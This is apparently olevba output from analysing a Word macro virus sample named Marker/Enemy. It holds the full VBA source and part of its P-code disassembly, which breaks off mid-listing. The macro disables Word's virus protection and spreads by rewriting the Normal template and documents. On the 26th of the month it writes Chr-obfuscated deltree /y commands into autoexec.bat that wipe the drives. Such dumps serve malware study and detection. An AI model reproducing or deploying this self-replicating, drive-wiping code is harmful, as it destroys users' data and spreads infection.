olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.ft
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.ft - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Enemy
Private Sub Document_Close()
'w97m/Enemy
On Error Resume Next
Options.VirusProtection = 0
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Dim Flag As Boolean
Dim hFile As Long
With Application
.EnableCancelKey = False
.ScreenUpdating = False
.DisplayAlerts = wdAlertsNone
.ShowVisualBasicEditor = False
End With
If Day(Now()) = 26 Then
If UCase(Dir(Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Chr(92) + Chr(98) + Chr(114) + Chr(115) + Chr(101) + Chr(99) + Chr(51) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108))) <> UCase(Chr(98) + Chr(114) + Chr(115) + Chr(101) + Chr(99) + Chr(51) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108)) Then
If UCase(Left$(Application.UserName, 1)) = "R" Then Flag = 1
BatMod = GetAttr(Chr(99) + Chr(58) + Chr(92) + Chr(97) + Chr(117) + Chr(116) + Chr(111) + Chr(101) + Chr(120) + Chr(101) + Chr(99) + Chr(46) + Chr(98) + Chr(97) + Chr(116))
SetAttr strFile, vbNormal
Deltree$ = Chr(100) + Chr(101) + Chr(108) + Chr(116) + Chr(114) + Chr(101) + Chr(101) + Chr(32) + Chr(47) + Chr(121) + Chr(32)
Nul$ = Chr(32) + Chr(62) + Chr(32) + Chr(110) + Chr(117) + Chr(108)
hFile = FreeFile
Open Chr(99) + Chr(58) + Chr(92) + Chr(97) + Chr(117) + Chr(116) + Chr(111) + Chr(101) + Chr(120) + Chr(101) + Chr(99) + Chr(46) + Chr(98) + Chr(97) + Chr(116) For Append Access Write As hFile
Print #hFile, vbCr + vbLf + Chr(64) + Chr(101) + Chr(99) + Chr(104) + Chr(111) + Chr(32) + Chr(111) + Chr(102) + Chr(102)
Print #hFile, Chr(98) + Chr(114) + Chr(101) + Chr(97) + Chr(107) + Chr(32) + Chr(111) + Chr(102) + Chr(102)
If Flag = 1 Then
Print #hFile, Deltree$ + Chr(102) + Chr(58) + Chr(92) + Nul$
Print #hFile, Deltree$ + Chr(101) + Chr(58) + Chr(92) + Nul$
Print #hFile, Deltree$ + Chr(100) + Chr(58) + Chr(92) + Nul$
End If
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Chr(109) + Chr(121) + Chr(100) + Chr(111) + Chr(99) + Chr(117) + Chr(126) + Chr(49) + Nul$
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Nul$
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Nul$
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Nul$
Close hFile
SetAttr strFile, BatMod
End If
End If
With Dialogs(wdDialogFileSummaryInfo)
.Author = ""
.Title = ""
.Subject = ""
.Comments = ""
.Keywords = ""
.Execute
End With
NormalAttrib = GetAttr(NormalTemplate.FullName)
If NormalAttrib = vbReadOnly Then GoTo Fuck
If NormalAttrib = vbReadOnly + vbArchive Then GoTo Fuck
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If ad.Lines(1, 1) <> Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) Then
If ad.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
ad.AddFromString (Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) & vbCr & Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & nt.Lines(3, nt.CountOfLines - 10))
End If
If nt.Lines(1, 1) <> Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) Then
If nt.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
nt.DeleteLines 1, nt.CountOfLines
nt.AddFromString (Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) & vbCr & Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ad.Lines(3, ad.CountOfLines - 2) _
& Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(86) + Chr(105) + Chr(101) + Chr(119) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(40) + Chr(41) & vbCr & Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) & vbCr & Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(40) + Chr(41) & vbCr & Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) & vbCr & Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(80) + Chr(114) + Chr(105) + Chr(110) + Chr(116) + Chr(40) + Chr(41) _
& vbCr & Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(80) + Chr(114) + Chr(105) + Chr(110) + Chr(116) + Chr(79) + Chr(117) + Chr(116) & vbCr & Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98))
End If
If nt.CountOfLines <> 0 And ad.CountOfLines = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Exit Sub
Fuck:
Norm$ = NormalTemplate
Attr$ = Chr(97) + Chr(116) + Chr(116) + Chr(114) + Chr(105) + Chr(98) + Chr(32) + Chr(45) + Chr(104) + Chr(32) + Chr(45) + Chr(114) + Chr(32)
Path1$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(49) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
Path2$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(50) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
DelCmd$ = Chr(100) + Chr(101) + Chr(108) + Chr(32)
hFile = FreeFile
Open Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(110) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(46) + Chr(98) + Chr(97) + Chr(116) For Append Access Write As hFile
Print #hFile, vbCr + vbLf + Chr(64) + Chr(101) + Chr(99) + Chr(104) + Chr(111) + Chr(32) + Chr(111) + Chr(102) + Chr(102)
Print #hFile, Attr$ + Path1$ + Norm$
Print #hFile, Attr$ + Path2$ + Norm$
Print #hFile, DelCmd$ + Path1$ + Norm$
Print #hFile, DelCmd$ + Path2$ + Norm$
Print #hFile, Chr(99) + Chr(108) + Chr(115)
Print #hFile, DelCmd$ + Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(110) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
Close hFile
End Sub
'Yes I know my enemies.
'They're the teachers who taught me to fight me
'Compromise, conformity, assimilation, submission
'Ignorance, hypocrisy, brutality, the elite...

Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub FilePrint()
ActiveDocument.PrintOut
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.ft
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 23445 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0005 "Enemy"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	QuoteRem 0x0000 0x000A "w97m/Enemy"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	Dim 
' 	VarDefn Flag (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #9:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith EnableCancelKey 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #12:
' 	Ld wdAlertsNone 
' 	MemStWith DisplayAlerts 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith ShowVisualBasicEditor 
' Line #14:
' 	EndWith 
' Line #15:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "R"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Flag 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd GetAttr 0x0001 
' 	St BatMod 
' Line #19:
' 	Ld strFile 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Deltree$ 
' Line #21:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Nul$ 
' Line #22:
' 	Ld Friend 
' 	St hFile 
' Line #23:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #24:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld vbCr 
' 	Ld vbLf 
' 	Add 
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #25:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #26:
' 	Ld Flag 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Deltree$ 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Nul$ 
' 	Add 
' 	PrintItemNL 
' Line #28:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Deltree$ 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Nul$ 
' 	Add 
' 	PrintItemNL 
' Line #29:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Deltree$ 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Nul$ 
' 	Add 
' 	PrintItemNL 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Deltree$ 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Nul$ 
' 	Add 
' 	PrintItemNL 
' Line #32:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Deltree$ 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Nul$ 
' 	Add 
' 	PrintItemNL 
' Line #33:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Deltree$ 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Nul$ 
' 	Add 
' 	PrintItemNL 
' Line #34:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Deltree$ 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Nul$ 
' 	Add 
' 	PrintItemNL 
' Line #35:
' 	Ld hFile 
' 	Close 0x0001 
' Line #36:
' 	Ld strFile 
' 	Ld BatMod 
' 	ArgsCall SetAttr 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #40:
' 	LitStr 0x0000 ""
' 	MemStWith Author 
' Line #41:
' 	LitStr 0x0000 ""
' 	MemStWith Title 
' Line #42:
' 	LitStr 0x0000 ""
' 	MemStWith Subject 
' Line #43:
' 	LitStr 0x0000 ""
' 	MemStWith Comments 
' Line #44:
' 	LitStr 0x0000 ""
' 	MemStWith Keywords 
' Line #45:
' 	ArgsMemCallWith Execute 0x0000 
' Line #46:
' 	EndWith 
' Line #47:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St NormalAttrib 
' Line #48:
' 	Ld NormalAttrib 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Fuck 
' 	EndIf 
' Line #49:
' 	Ld NormalAttrib 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Fuck 
' 	EndIf 
' Line #50:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #52:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ne 
' 	IfBlock 
' Line #53:
' 	Ld ad 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #54:
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
